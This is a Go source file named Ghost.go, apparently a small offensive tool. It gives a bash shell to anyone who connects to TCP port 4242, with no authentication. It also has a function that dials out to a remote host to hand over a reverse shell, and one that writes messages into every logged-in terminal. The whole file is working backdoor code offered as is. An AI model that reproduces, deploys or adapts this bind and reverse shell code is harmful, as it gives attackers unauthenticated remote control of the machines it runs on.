//
// Ghost.go
//
// lukem1
// 30 March 2021
//

package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)


// Write a message to all pts sessions
func ghostsay(msg string) {
	dir := "/dev/pts"
	pts, e := os.ReadDir(dir)
	if e != nil {
		log.Printf(e.Error())
	}
	
	for _, s := range pts {
		f := fmt.Sprintf("%s/%s", dir, s.Name())
		if s.Name() != "ptmx" {
			os.WriteFile(f, []byte(msg), 0666)
		}
	}
}


// dial connects to the specified host:port and creates a reverse shell
func dial(host string, port int) {
	log.Printf("Calling %s:%d...\n", host, port)
	
	c, e := net.Dial("tcp",fmt.Sprintf("%s:%d", host, port))
	if e != nil {
		log.Printf("Failed to connect.\n")
		return
	}
	log.Printf("Connected to %s:%d.\n", host, port)
	banner := "Ghost is Listening...\n"
	c.Write([]byte(banner))
	
	shell := exec.Command("/bin/bash")
	shell.Stdin=c;shell.Stdout=c;shell.Stderr=c;
	shell.Run()
}


// bind listens on the specified tcp port and provides a shell
func bind(port int) {
	// Start listening on the specified tcp port
	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
	log.Printf("Listening on port %d...\n", port) 
	if e != nil {
		log.Fatal(e)
	}
	
	// Close the listener when bind returns
	defer l.Close()
	
	// session func to handle connections
	session := func (c net.Conn) {
		log.Printf("Recieved connection from %s!\n", c.RemoteAddr())
		banner := "Ghost is Listening...\n"
		c.Write([]byte(banner))
		
		// Execute bash and pass to the connection
		shell := exec.Command("/bin/bash")
		shell.Stdin = c; shell.Stdout = c; shell.Stderr = c;
		shell.Run()
		
		c.Close()
		log.Printf("Connection from %s closed.\n", c.RemoteAddr())
	}
	
	// Accept any incoming connections
	for {
		c, e := l.Accept()
		if e != nil {
			log.Print(e)
		}
		// Start a goroutine to handle any connections
		go session(c)
	}
}

func main() {
	fmt.Printf("Hello from %d", os.Getpid())
	fmt.Printf(" (ppid: %d, uid: %d)\n", os.Getppid(), os.Getuid())
	
	bind(4242)
	//ghostsay("\nHello\n")
	//dial("", 2424)
}
